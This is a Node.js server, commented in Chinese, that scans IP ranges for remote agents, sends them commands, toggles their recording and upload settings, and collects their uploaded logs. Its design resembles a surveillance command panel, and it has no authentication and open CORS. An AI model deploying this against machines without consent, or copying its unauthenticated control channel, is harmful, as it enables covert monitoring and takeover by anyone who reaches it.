const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const net = require('net');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const LOGS_DIR = path.join(__dirname, 'logs');
const KNOWN_CLIENTS_FILE = path.join(__dirname, 'known_clients.json');
if (!fs.existsSync(LOGS_DIR)) {
    fs.mkdirSync(LOGS_DIR, { recursive: true });
}

class ClientManager {
    constructor() {
        this.clients = new Map();
        this.webClients = new Set();
        this.knownClients = new Set();
        this.heartbeatInterval = 30000;
        this.reconnectInterval = 10000;
        this.maxReconnectAttempts = 5;
        this.loadKnownClients();
        this.startHeartbeat();
        this.startReconnectLoop();
    }

    addClient(socket, ip, port, reconnectAttempts = 0) {
        const clientId = `${ip}:${port}`;
        const client = {
            id: clientId,
            ip,
            port,
            socket,
            status: 'online',
            recording: true,
            uploadEnabled: false,
            lastSeen: new Date(),
            logDir: path.join(LOGS_DIR, ip.replace(/\./g, '_')),
            commandQueue: [],
            pendingResponse: null,
            reconnectAttempts,
            shouldReconnect: true
        };

        if (!fs.existsSync(client.logDir)) {
            fs.mkdirSync(client.logDir, { recursive: true });
        }

        this.clients.set(clientId, client);
        this.knownClients.add(clientId);
        this.saveKnownClients();
        this.setupSocketListeners(client);
        this.broadcastToWeb({ type: 'client_connected', client: this.getClientInfo(client) });
        
        return client;
    }

    removeClient(clientId, shouldReconnect = true) {
        const client = this.clients.get(clientId);
        if (client) {
            client.status = 'offline';
            client.shouldReconnect = shouldReconnect;
            this.broadcastToWeb({ type: 'client_disconnected', clientId });
        }
    }

    setupSocketListeners(client) {
        client.socket.on('data', (data) => {
            try {
                const messages = data.toString().split('\n').filter(m => m.trim());
                messages.forEach(msg => {
                    try {
                        const response = JSON.parse(msg);
                        this.handleResponse(client, response);
                    } catch (e) {
                        console.error('解析响应失败:', msg);
                    }
                });
            } catch (e) {
                console.error('处理数据失败:', e);
            }
        });

        client.socket.on('close', () => {
            console.log(`客户端 ${client.id} 连接关闭，将尝试重连`);
            this.removeClient(client.id, true);
        });

        client.socket.on('error', (err) => {
            console.error(`客户端 ${client.id} 错误:`, err.message);
            this.removeClient(client.id, true);
        });
    }

    handleResponse(client, response) {
        client.lastSeen = new Date();
        
        if (response.status === 'ok') {
            if (response.data) {
                if (response.data.recording !== undefined) {
                    client.recording = response.data.recording;
                }
                if (response.data.upload_enabled !== undefined) {
                    client.uploadEnabled = response.data.upload_enabled;
                }
            }
        }

        this.broadcastToWeb({
            type: 'client_response',
            clientId: client.id,
            response
        });
    }

    sendCommand(clientId, command) {
        const client = this.clients.get(clientId);
        if (!client || client.status === 'offline') {
            return { success: false, error: '客户端离线' };
        }

        return new Promise((resolve) => {
            const commandStr = JSON.stringify(command) + '\n';
            
            client.socket.write(commandStr, (err) => {
                if (err) {
                    resolve({ success: false, error: err.message });
                } else {
                    resolve({ success: true });
                }
            });
        });
    }

    async broadcastCommand(command) {
        const results = [];
        for (const [clientId, client] of this.clients) {
            if (client.status === 'online') {
                const result = await this.sendCommand(clientId, command);
                results.push({ clientId, ...result });
            }
        }
        return results;
    }

    startHeartbeat() {
        setInterval(() => {
            this.clients.forEach(async (client, clientId) => {
                if (client.status === 'online') {
                    try {
                        const result = await this.sendCommand(clientId, { action: 'ping' });
                        if (!result.success) {
                            console.log(`心跳失败: ${clientId}`);
                            client.status = 'offline';
                            this.broadcastToWeb({ type: 'client_offline', clientId });
                        }
                    } catch (e) {
                        console.log(`心跳异常: ${clientId}`, e.message);
                        client.status = 'offline';
                        this.broadcastToWeb({ type: 'client_offline', clientId });
                    }
                }
            });
        }, this.heartbeatInterval);
    }

    startReconnectLoop() {
        setInterval(() => {
            this.clients.forEach(async (client, clientId) => {
                if (client.status === 'offline' && client.shouldReconnect) {
                    if (client.reconnectAttempts >= this.maxReconnectAttempts) {
                        console.log(`客户端 ${clientId} 重连次数已达上限，停止重连`);
                        client.shouldReconnect = false;
                        return;
                    }

                    console.log(`尝试重连客户端: ${clientId} (第 ${client.reconnectAttempts + 1} 次)`);
                    
                    try {
                        const result = await this.tryReconnect(client.ip, client.port, client.reconnectAttempts + 1);
                        if (result) {
                            console.log(`客户端 ${clientId} 重连成功`);
                            client.reconnectAttempts = 0;
                            client.shouldReconnect = true;
                        } else {
                            client.reconnectAttempts++;
                        }
                    } catch (e) {
                        console.error(`重连失败: ${clientId}`, e.message);
                        client.reconnectAttempts++;
                    }
                }
            });
        }, this.reconnectInterval);
    }

    loadKnownClients() {
        try {
            if (fs.existsSync(KNOWN_CLIENTS_FILE)) {
                const data = fs.readFileSync(KNOWN_CLIENTS_FILE, 'utf-8');
                const clients = JSON.parse(data);
                clients.forEach(client => this.knownClients.add(`${client.ip}:${client.port}`));
            }
        } catch (e) {
            console.error('加载已知客户端失败:', e);
        }
    }

    saveKnownClients() {
        try {
            const clients = Array.from(this.knownClients).map(id => {
                const [ip, port] = id.split(':');
                return { ip, port: parseInt(port) };
            });
            fs.writeFileSync(KNOWN_CLIENTS_FILE, JSON.stringify(clients, null, 2));
        } catch (e) {
            console.error('保存已知客户端失败:', e);
        }
    }

    getClientInfo(client) {
        return {
            id: client.id,
            ip: client.ip,
            port: client.port,
            status: client.status,
            recording: client.recording,
            uploadEnabled: client.uploadEnabled,
            lastSeen: client.lastSeen
        };
    }

    getAllClients() {
        const allClients = [];
        
        // 添加当前在线客户端
        for (const client of this.clients.values()) {
            allClients.push(this.getClientInfo(client));
        }
        
        // 添加已知但离线的客户端
        for (const clientId of this.knownClients) {
            if (!this.clients.has(clientId)) {
                const [ip, port] = clientId.split(':');
                allClients.push({
                    id: clientId,
                    ip,
                    port: parseInt(port),
                    status: 'offline',
                    recording: false,
                    uploadEnabled: false,
                    lastSeen: null
                });
            }
        }
        
        return allClients;
    }

    addWebClient(ws) {
        this.webClients.add(ws);
        ws.send(JSON.stringify({
            type: 'clients_list',
            clients: this.getAllClients()
        }));
    }

    removeWebClient(ws) {
        this.webClients.delete(ws);
    }

    broadcastToWeb(data) {
        const message = JSON.stringify(data);
        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(message);
            }
        });
    }

    async scanNetwork(startIp, endIp, ports) {
        const foundClients = [];
        const baseIp = startIp.split('.').slice(0, 3).join('.');
        const start = parseInt(startIp.split('.')[3]);
        const end = parseInt(endIp.split('.')[3]);

        for (let i = start; i <= end; i++) {
            const ip = `${baseIp}.${i}`;
            for (const port of ports) {
                try {
                    const client = await this.tryConnect(ip, port);
                    if (client) {
                        foundClients.push(client);
                    }
                } catch (e) {
                    // 忽略连接失败的
                }
            }
        }

        return foundClients;
    }

    tryConnect(ip, port, reconnectAttempts = 0) {
        return new Promise((resolve) => {
            // 清理 IP 地址，移除 CIDR 表示法中的 / 部分
            const cleanIp = ip.split('/')[0];
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            let resolved = false;
            const clientId = `${cleanIp}:${port}`;

            const cleanup = () => {
                if (!resolved) {
                    resolved = true;
                    socket.destroy();
                    if (!this.clients.has(clientId) || this.clients.get(clientId).status === 'offline') {
                        this.clients.delete(clientId);
                    }
                    resolve(null);
                }
            };

            socket.connect(port, cleanIp, () => {
                console.log(`TCP 连接成功: ${cleanIp}:${port}`);
                const client = this.addClient(socket, cleanIp, port, reconnectAttempts);
                
                const checkStatus = () => {
                    if (resolved) return;
                    
                    const currentClient = this.clients.get(clientId);
                    if (currentClient && currentClient.lastSeen > new Date(Date.now() - 3000)) {
                        resolved = true;
                        resolve(this.getClientInfo(currentClient));
                    } else {
                        setTimeout(checkStatus, 500);
                    }
                };
                
                setTimeout(() => {
                    if (!resolved) {
                        console.log(`等待响应超时: ${clientId}`);
                        cleanup();
                    }
                }, 3000);
                
                setTimeout(checkStatus, 500);
            });

            socket.on('error', (err) => {
                console.error('连接错误:', err.message);
                cleanup();
            });

            socket.on('timeout', () => {
                console.error('连接超时');
                cleanup();
            });
            
            socket.on('close', () => {
                console.log(`连接关闭: ${clientId}`);
                if (!resolved) {
                    cleanup();
                }
            });
        });
    }

    manualConnect(ip, port) {
        return this.tryConnect(ip, port);
    }
}

const clientManager = new ClientManager();

wss.on('connection', (ws) => {
    console.log('Web 客户端已连接');
    clientManager.addWebClient(ws);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            
            switch (data.type) {
                case 'command':
                    const result = await clientManager.sendCommand(data.clientId, data.command);
                    ws.send(JSON.stringify({ type: 'command_result', result }));
                    break;
                
                case 'broadcast_command':
                    const results = await clientManager.broadcastCommand(data.command);
                    ws.send(JSON.stringify({ type: 'broadcast_result', results }));
                    break;
                
                case 'scan_network':
                    const found = await clientManager.scanNetwork(
                        data.startIp,
                        data.endIp,
                        data.ports || [9999]
                    );
                    ws.send(JSON.stringify({ type: 'scan_complete', found }));
                    break;
                
                case 'manual_connect':
                    const client = await clientManager.manualConnect(data.ip, data.port);
                    ws.send(JSON.stringify({ type: 'connect_result', client }));
                    break;
                
                case 'disconnect_client':
                    const targetClient = clientManager.clients.get(data.clientId);
                    if (targetClient) {
                        targetClient.shouldReconnect = false;
                        targetClient.socket.end();
                        clientManager.removeClient(data.clientId, false);
                    }
                    ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
                    break;
            }
        } catch (e) {
            ws.send(JSON.stringify({ type: 'error', message: e.message }));
        }
    });

    ws.on('close', () => {
        console.log('Web 客户端已断开');
        clientManager.removeWebClient(ws);
    });
});

app.get('/api/clients', (req, res) => {
    res.json(clientManager.getAllClients());
});

app.get('/api/clients/:clientId/logs', (req, res) => {
    const client = clientManager.clients.get(req.params.clientId);
    if (!client) {
        return res.status(404).json({ error: '客户端不存在' });
    }

    try {
        const files = fs.readdirSync(client.logDir)
            .filter(f => f.endsWith('.log'))
            .map(f => {
                const stat = fs.statSync(path.join(client.logDir, f));
                return {
                    filename: f,
                    size: stat.size,
                    uploadTime: stat.mtime
                };
            });
        res.json(files);
    } catch (e) {
        res.json([]);
    }
});

app.get('/api/clients/:clientId/logs/:filename', (req, res) => {
    const client = clientManager.clients.get(req.params.clientId);
    if (!client) {
        return res.status(404).json({ error: '客户端不存在' });
    }

    const filePath = path.join(client.logDir, req.params.filename);
    if (!filePath.startsWith(client.logDir)) {
        return res.status(403).json({ error: '非法路径' });
    }

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        res.json({ content });
    } catch (e) {
        res.status(404).json({ error: '文件不存在' });
    }
});

app.get('/api/clients/:clientId/logs/:filename/download', (req, res) => {
    const client = clientManager.clients.get(req.params.clientId);
    if (!client) {
        return res.status(404).json({ error: '客户端不存在' });
    }

    const filePath = path.join(client.logDir, req.params.filename);
    if (!filePath.startsWith(client.logDir)) {
        return res.status(403).json({ error: '非法路径' });
    }

    res.download(filePath);
});

app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: '10mb' }), (req, res) => {
    const ip = req.params.ip;
    const clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
    
    if (!clientId) {
        return res.status(404).json({ error: '客户端不存在' });
    }

    const client = clientManager.clients.get(clientId);
    const filename = `${ip}_${new Date().toISOString().split('T')[0].replace(/-/g, '')}.log`;
    const filePath = path.join(client.logDir, filename);

    fs.appendFile(filePath, req.body, (err) => {
        if (err) {
            return res.status(500).json({ error: '保存失败' });
        }
        res.json({ success: true, filename });
    });
});

const PORT = process.env.PORT || 3232;
server.listen(PORT, async () => {
    console.log(`服务器运行在端口 ${PORT}`);
    console.log(`访问 http://localhost:${PORT} 打开管理界面`);
    
    // 启动后尝试连接已知客户端
    for (const clientId of clientManager.knownClients) {
        const [ip, port] = clientId.split(':');
        console.log(`尝试连接已知客户端: ${ip}:${port}`);
        try {
            await clientManager.tryConnect(ip, parseInt(port));
        } catch (e) {
            console.log(`连接已知客户端失败: ${clientId}`);
        }
    }
});
